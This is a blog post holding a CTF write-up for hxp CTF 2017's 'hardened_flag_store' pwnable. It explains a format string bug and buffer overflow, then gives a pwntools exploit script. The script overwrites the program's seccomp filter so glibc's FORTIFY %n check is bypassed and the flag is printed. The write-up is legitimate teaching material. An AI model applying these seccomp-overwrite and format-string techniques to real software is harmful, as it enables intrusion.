<!doctype html>



  


<html class="theme-next pisces use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>






<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="CTF,Pwnable,Python,format_string,BOF,seccomp,hxp," />





  <link rel="alternate" href="/atom.xml" title="Hacking Tube 2.0" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />






<meta name="description" content="Category: Pwnable 64 bit ELF with PIE, NX, FULL RELRO enabled">
<meta name="keywords" content="CTF,Pwnable,Python,format_string,BOF,seccomp,hxp">
<meta property="og:type" content="article">
<meta property="og:title" content="hxp CTF 2017 -- hardened_flag_store">
<meta property="og:url" content="https://bruce30262.github.io/2017/11/20/hxp-CTF-2017-hardened-flag-store/index.html">
<meta property="og:site_name" content="Hacking Tube 2.0">
<meta property="og:description" content="Category: Pwnable 64 bit ELF with PIE, NX, FULL RELRO enabled">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2018-01-03T15:08:05.611Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hxp CTF 2017 -- hardened_flag_store">
<meta name="twitter:description" content="Category: Pwnable 64 bit ELF with PIE, NX, FULL RELRO enabled">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://bruce30262.github.io/2017/11/20/hxp-CTF-2017-hardened-flag-store/"/>





  <title>hxp CTF 2017 -- hardened_flag_store | Hacking Tube 2.0</title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-100090256-1', 'auto');
  ga('send', 'pageview');
</script>












  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hacking Tube 2.0</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Security and stuff.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="https://bruce30262.github.io/2017/11/20/hxp-CTF-2017-hardened-flag-store/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Bruce Chen">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hacking Tube 2.0">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">hxp CTF 2017 -- hardened_flag_store</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-20T19:18:00+08:00">
                2017-11-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/11/20/hxp-CTF-2017-hardened-flag-store/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2017/11/20/hxp-CTF-2017-hardened-flag-store/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-eye"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>views
            </span>
          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><strong>Category:</strong> Pwnable</p>
<p>64 bit ELF with PIE, NX, FULL RELRO enabled </p>
<a id="more"></a>  
<p>The program will read a secret string from “secret.txt” and store the string address on stack. Then it will use seccomp to create a whitelist of syscalls. We can analyze the filter by using <a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>So now the program are only allowed to use the following system calls: <code>exit</code>, <code>read</code>, <code>write</code>, <code>open</code> and <code>close</code>.  </p>
<p>After that the program will do the following ( pseudo code ) :  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cnt = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">int</span> has_seccomp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (cnt--)</span><br><span class="line">&#123;</span><br><span class="line">    read(<span class="number">0</span>, input, <span class="number">96</span>); <span class="comment">// read user input</span></span><br><span class="line">    <span class="keyword">if</span> (!has_seccomp) init_seccomp(); <span class="comment">// set up seccomp rule</span></span><br><span class="line">    len = <span class="built_in">strlen</span>(secret_string) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; i++ ) <span class="comment">// check if input == secret_string</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( len - <span class="number">1</span> == i )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">        <span class="keyword">if</span> ( secret_string[i] != input[i] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong secret :/"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(secret_string) == i )</span><br><span class="line">LABEL_19:</span><br><span class="line">        openflag(); <span class="comment">// input == secret_string, open flag.txt and print it to stdout</span></span><br><span class="line">    _fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1L</span>L, input); <span class="comment">// &lt;-- format string vuln</span></span><br><span class="line">    has_seccomp = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can spot a format string vulnerability @ line 19. Although the secret string’s address is stored on stack, however the output of <code>_fprintf_chk</code> is set to stderr, so we can’t use <code>%s</code> to leak the secret string.  </p>
<p>But there’s still one way to bypass the check. At line 16:  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(secret_string) == i )</span><br><span class="line">LABEL_19:</span><br><span class="line">        openflag(); <span class="comment">// input == secret_string, open flag.txt and print it to stdout</span></span><br></pre></td></tr></table></figure>
<p>If we can overwrite the first character of the secret string to a null byte, and input a random string, both <code>strlen(secret_string)</code> and <code>i</code> will be <code>0</code>, thus bypass the check and will print out the flag.  </p>
<p>However this will require us to use the <code>%n</code> format string payload – which in this case will be blocked by the seccomp filter:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./flag_store</span><br><span class="line">%n</span><br><span class="line">Wrong secret :/</span><br><span class="line">[1]    5295 invalid system call  ./flag_store</span><br></pre></td></tr></table></figure>
<p>Fortunately my teammate found that there’s a buffer overflow vulnerability while reading the user input. We can input at most 96 chars to the buffer, while its size is only 32. Moreover, this make us able to overwrite the seccomp rule ! So then we overwrite the seccomp rule with a bunch of null bytes and send the <code>%n</code> character:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Sending null bytes</span><br><span class="line">[*] Sending fmt payload</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Wrong secret :/</span><br><span class="line">Wrong secret :/</span><br><span class="line">*** %n in writable segment detected ***</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>
<p>OK, so we successfully overwrite the seccomp rule, but still the <code>%n</code> payload was blocked by <code>_fprintf_chk</code>, which is a more secure version of <code>fprintf</code>. At this point I started to think that maybe we need to write some seccomp rules to bypass the format string check.</p>
<p>And so I started reading the <a href="https://code.woboq.org/userspace/glibc/stdio-common/vfprintf.c.html#__readonly_area" target="_blank" rel="noopener">glibc source code</a>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">................</span><br><span class="line">    &#123;                                                                      \</span><br><span class="line">      <span class="keyword">extern</span> <span class="keyword">int</span> __readonly_area (<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>)                      \</span><br><span class="line">        attribute_hidden;                                              \</span><br><span class="line">      readonly_format                                                      \</span><br><span class="line">        = __readonly_area (format, ((STR_LEN (format) + <span class="number">1</span>)              \</span><br><span class="line">                                    * <span class="keyword">sizeof</span> (CHAR_T)));              \</span><br><span class="line">    &#125;                                                                      \</span><br><span class="line">  <span class="keyword">if</span> (readonly_format &lt; <span class="number">0</span>)                                              \</span><br><span class="line">    __libc_fatal (<span class="string">"*** %n in writable segment detected ***\n"</span>);              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Hmmmm, looks like we’ll have to make <code>readonly_format &gt;= 0</code> so it won’t call <code>__libc_fatal (&quot;*** %n in writable segment detected ***\n&quot;);</code>. Let’s trace into the <a href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/readonly-area.c.html#__readonly_area" target="_blank" rel="noopener">__readonly_area() function</a>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__readonly_area (<span class="keyword">const</span> <span class="keyword">char</span> *ptr, <span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *ptr_end = ptr + size;</span><br><span class="line"></span><br><span class="line">  FILE *fp = fopen (<span class="string">"/proc/self/maps"</span>, <span class="string">"rce"</span>);</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* It is the system administrator's choice to not have /proc</span></span><br><span class="line"><span class="comment">         available to this process (e.g., because it runs in a chroot</span></span><br><span class="line"><span class="comment">         environment.  Don't fail in this case.  */</span></span><br><span class="line">      <span class="keyword">if</span> (errno == ENOENT</span><br><span class="line">          <span class="comment">/* The kernel has a bug in that a process is denied access</span></span><br><span class="line"><span class="comment">             to the /proc filesystem if it is set[ug]id.  There has</span></span><br><span class="line"><span class="comment">             been no willingness to change this in the kernel so</span></span><br><span class="line"><span class="comment">             far.  */</span></span><br><span class="line">          || errno == EACCES)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...................</span><br></pre></td></tr></table></figure>
<p>Ah ha ! We can see that <code>__readonly_area</code> will call <code>fopen()</code>, and see if its <code>errno</code> is equals to <code>EACCES</code> or <code>ENOENT</code>. <strong>If so, it will return 1</strong> !! Since we can write our own seccomp rule, we can totally make this happen !</p>
<p>So first we create our own seccomp rule:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># # check if arch is X86_64</span><br><span class="line">A = arch</span><br><span class="line">A == 0xc000003e ? next : ok</span><br><span class="line">A = sys_number</span><br><span class="line">A == open ? next : ok</span><br><span class="line">A = args[2]</span><br><span class="line">A == 0x1b6 ? magic : ok # check the 3rd arg of open()</span><br><span class="line">magic:</span><br><span class="line">return ERRNO(13) # ERRNO(EACCES)</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>
<p>Notice that in order to make <code>open(&quot;flag.txt&quot;, 0x80000)</code> ( in the <code>openflag()</code> function ) works normally, we’ll have to add the rule <code>A == 0x1b6 ? magic : ok</code>. This indicates that if the 3rd argument of <code>open()</code> equals to <code>0x1b6</code>, return <code>ERRNO(13)</code>, otherwise allow the system call. I wrote this rule because I found that when <code>__readonly_area()</code> calls <code>fopen (&quot;/proc/self/maps&quot;, &quot;rce&quot;);</code>, the 3rd argument of <code>open()</code> was exactly <code>0x1b6</code>.  </p>
<p>By using the <a href="https://github.com/david942j/seccomp-tools#asm" target="_blank" rel="noopener">asm</a> feature of the seccomp-tools, we can generate the raw bytes of our seccomp rule:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ cat ./rule </span><br><span class="line"># # check if arch is X86_64</span><br><span class="line">A = arch</span><br><span class="line">A == 0xc000003e ? next : ok</span><br><span class="line">A = sys_number</span><br><span class="line">A == open ? next : ok</span><br><span class="line">A = args[2]</span><br><span class="line">A == 0x1b6 ? magic : ok</span><br><span class="line">magic:</span><br><span class="line">return ERRNO(13)</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br><span class="line"></span><br><span class="line">$ seccomp-tools asm ./rule</span><br><span class="line">&quot; \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05&gt;\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00 \x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F&quot;</span><br></pre></td></tr></table></figure>
<p>At last we apply our seccomp rule, exploit the format string vulnerability to bypass the check and get the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># from brucepwn import *</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"35.198.105.104"</span></span><br><span class="line">PORT = <span class="number">10000</span></span><br><span class="line">ELF_PATH = <span class="string">"./flag_store"</span></span><br><span class="line">LIBC_PATH = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line">libc = elf.libc <span class="keyword">if</span> <span class="keyword">not</span> LIBC_PATH <span class="keyword">else</span> ELF(LIBC_PATH)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> libc: log.warning(<span class="string">"Failed to load libc"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = elf.process() # elf.process(argv=[argv1, argv2,...])</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"\x00"</span>*<span class="number">0x20</span></span><br><span class="line">    payload += <span class="string">" \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05&gt;\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00 \x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"len:"</span>, len(payload)</span><br><span class="line">    <span class="keyword">assert</span> len(payload) &lt;= <span class="number">96</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    r.sendline(<span class="string">"%128c%128c%hhn"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
<p>flag: <code>hxp{d0n7_w0rry_glibc_1_571ll_l0v3_y0u}</code></p>
<p>First blood on this one ! WOOHOO ! 😎</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
            <a href="/tags/Pwnable/" rel="tag"># Pwnable</a>
          
            <a href="/tags/Python/" rel="tag"># Python</a>
          
            <a href="/tags/format-string/" rel="tag"># format_string</a>
          
            <a href="/tags/BOF/" rel="tag"># BOF</a>
          
            <a href="/tags/seccomp/" rel="tag"># seccomp</a>
          
            <a href="/tags/hxp/" rel="tag"># hxp</a>
          
        </div>
      

      
        
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/" rel="next" title="MeePwn CTF 2017 -- Brainfuck 1 & 2">
                <i class="fa fa-chevron-left"></i> MeePwn CTF 2017 -- Brainfuck 1 & 2
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="prev" title="Learning browser exploitation via 33C3 CTF  feuerfuchs challenge">
                Learning browser exploitation via 33C3 CTF  feuerfuchs challenge <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
        <!-- Go to www.addthis.com/dashboard to customize your tools -->
<div class="addthis_inline_share_toolbox">
  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6" async = "async" ></script>
</div>

      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80"
               alt="Bruce Chen" />
          <p class="site-author-name" itemprop="name">Bruce Chen</p>
           
              <p class="site-description motion-element" itemprop="description">Security researcher / CTFer / Pwner</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">50</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">65</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/bruce30262" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  Github
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/bruce30262" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://www.facebook.com/bruce.chen.102" target="_blank" title="Facebook">
                  
                    <i class="fa fa-fw fa-facebook"></i>
                  
                  Facebook
                </a>
              </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element" itemprop="license">
            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
            </a>
          </div>
        

        
        

        


      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2017 - 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Chen</span>
</div>


<div class="powered-by">
  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      Total visitors
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      Total views
    </span>
  
</div>


        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
